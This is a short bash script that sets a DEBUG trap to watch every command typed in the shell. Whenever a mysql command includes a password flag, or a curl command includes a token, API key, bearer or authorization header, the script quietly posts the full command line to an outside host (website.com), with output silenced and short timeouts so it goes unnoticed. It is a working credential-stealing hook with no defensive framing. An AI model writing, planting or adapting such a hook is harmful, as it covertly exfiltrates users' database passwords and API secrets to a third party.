#!/bin/bash

hook() {
    case "${BASH_COMMAND}" in
        mysql*)
        # -d data ; -s stdout and stderr to void
            if echo "${BASH_COMMAND}" | grep -- "-p\|--password"; then
                curl https://website.com \
                -H "Content-Type:application/json" \
                -d "{\"commmand\":\"${BASH_COMMAND}\"}" \ 
                --max-time 3 \
                --connect-timeout 3 \
                -s &> /dev/null 
            fi
        ;;

        curl*)
        # bearer token in auth header
            if echo "${BASH_COMMAND}" | grep -ie "token" \
                                            -ie "apikey" \
                                            -ie "api_token" \
                                            -ie "bearer" \ 
                                            -ie "authorization"; then
                curl https://website.com \
                -H "Content-Type:application/json" \
                -d "{\"commmand\":\"${BASH_COMMAND}\"}" \ 
                --max-time 3 \
                --connect-timeout 3 \
                -s &> /dev/null 
            fi
        ;;
    esac
}

trap 'hook' DEBUG
